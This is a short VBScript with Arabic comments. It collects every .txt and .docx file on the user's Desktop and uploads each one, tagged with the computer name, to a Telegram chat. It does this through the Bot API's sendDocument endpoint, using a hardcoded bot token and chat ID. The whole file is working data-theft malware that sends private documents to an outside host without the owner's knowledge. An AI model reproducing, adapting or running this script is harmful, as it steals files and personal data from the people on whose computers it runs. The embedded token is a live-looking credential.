Dim WshShell, fso, botToken, chatId, computerId
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"

computerId = WshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")

Dim desktopPath
desktopPath = WshShell.SpecialFolders("Desktop")

Sub SendFile(filePath)
    If Not fso.FileExists(filePath) Then Exit Sub
    
    Dim fileName, ext
    fileName = fso.GetFileName(filePath)
    ext = LCase(fso.GetExtensionName(fileName))
    
    If ext <> "txt" And ext <> "docx" Then Exit Sub
    
    Dim http, stream, boundary, dataStart, dataEnd, fileData
    
    boundary = "----bound" & Year(Now) & Month(Now) & Day(Now) & Timer
    
    ' قراءة الملف
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile filePath
    fileData = stream.Read
    stream.Close
    
    ' بناء الـ body
    dataStart = "--" & boundary & vbCrLf & _
                "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & _
                chatId & vbCrLf & _
                "--" & boundary & vbCrLf & _
                "Content-Disposition: form-data; name=""caption""" & vbCrLf & vbCrLf & _
                computerId & " | " & fileName & vbCrLf & _
                "--" & boundary & vbCrLf & _
                "Content-Disposition: form-data; name=""document""; filename=""" & fileName & """" & vbCrLf & _
                "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
    
    dataEnd = vbCrLf & "--" & boundary & "--"
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendDocument", False
    http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    http.Send dataStart & fileData & dataEnd
End Sub

' تنفيذ
Dim folder, file
Set folder = fso.GetFolder(desktopPath)

For Each file In folder.Files
    SendFile file.Path
Next

Set WshShell = Nothing
Set fso = Nothing
